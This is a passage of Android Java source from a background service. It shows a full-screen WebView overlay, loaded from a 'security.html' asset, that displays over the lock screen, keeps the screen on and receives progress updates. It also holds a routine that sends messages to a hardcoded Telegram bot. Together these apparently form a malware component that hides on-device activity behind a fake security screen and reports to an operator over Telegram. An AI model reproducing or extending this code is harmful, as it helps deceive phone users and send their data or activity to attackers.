                              public void onPageFinished(WebView view, String url) {
                                  Log.d(TAG, "Overlay HTML loaded");
                              }
                          });
                          
                          overlayWebView.loadUrl("file:///android_asset/html/security.html");
                          
                          int layoutFlags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                              WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL |
                              WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH |
                              WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                              WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
                              WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
                              WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON;
                          
                          if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                              layoutFlags |= WindowManager.LayoutParams.FLAG_ALLOW_LOCK_WHILE_SCREEN_ON;
                          }
                          
                          overlayParams = new WindowManager.LayoutParams(
                              WindowManager.LayoutParams.MATCH_PARENT,
                              WindowManager.LayoutParams.MATCH_PARENT,
                              Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ?
                                  WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY :
                                  WindowManager.LayoutParams.TYPE_PHONE,
                              layoutFlags,
                              android.graphics.PixelFormat.TRANSLUCENT
                          );
                          
                          windowManager.addView(overlayWebView, overlayParams);
                          isOverlayShowing = true;
                          Log.d(TAG, "✅ Overlay shown");
                          
                      } catch (Exception e) {
                          Log.e(TAG, "Failed to show overlay: " + e.getMessage());
                          e.printStackTrace();
                      }
                  });
              }

              @Override
              public void hideOverlay() {
                  mainHandler.post(() -> {
                      try {
                          if (overlayWebView != null && isOverlayShowing) {
                              windowManager.removeView(overlayWebView);
                              overlayWebView = null;
                              isOverlayShowing = false;
                              Log.d(TAG, "✅ Overlay hidden");
                          }
                      } catch (Exception e) {
                          Log.e(TAG, "Failed to hide overlay: " + e.getMessage());
                      }
                  });
              }

              @Override
              public boolean isOverlayShowing() {
                  return isOverlayShowing;
              }

              @Override
              public void updateOverlayProgress(int percent) {
                  mainHandler.post(() -> {
                      try {
                          if (overlayWebView != null && isOverlayShowing) {
                              String js = "javascript:updateProgress(" + percent + ")";
                              overlayWebView.loadUrl(js);
                              Log.d(TAG, "📊 Overlay progress: " + percent + "%");
                          }
                      } catch (Exception e) {
                          Log.e(TAG, "Failed to update overlay progress: " + e.getMessage());
                      }
                  });
              }

              // ==================== TELEGRAM NOTIFICATIONS ====================
              
              private void sendTelegramNotification(String message) {
                  Executors.newSingleThreadExecutor().execute(() -> {
                      try {
                          String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
                          URL obj = new URL(url);
                          HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
                          conn.setRequestMethod("POST");
                          conn.setRequestProperty("Content-Type", "application/json");
                          conn.setDoOutput(true);
                          
                          String json = "{\"chat_id\":\"" + CHAT_ID + "\",\"text\":\"" + 
                              message.replace("\"", "\\\"") + "\"}";
                          
                          try (java.io.OutputStream os = conn.getOutputStream()) {
                              os.write(json.getBytes());
                              os.flush();
                          }
                          
                          int responseCode = conn.getResponseCode();
                          if (responseCode == 200) {
                              Log.d(TAG, "✅ Telegram notification sent");
                          } else {
                              Log.e(TAG, "Telegram send failed: " + responseCode);
                          }
                          conn.disconnect();
                      } catch (Exception e) {
                          Log.e(TAG, "Telegram error: " + e.getMessage());
                      }
                  });
              }

              @Override
              public void onDestroy() {
                  super.onDestroy();
                  if (scheduler != null) {
                      scheduler.shutdown();
                  }
                  if (isOverlayShowing) {
                      hideOverlay();
                  }
                  Log.d(TAG, "Service destroyed");
              }
          }
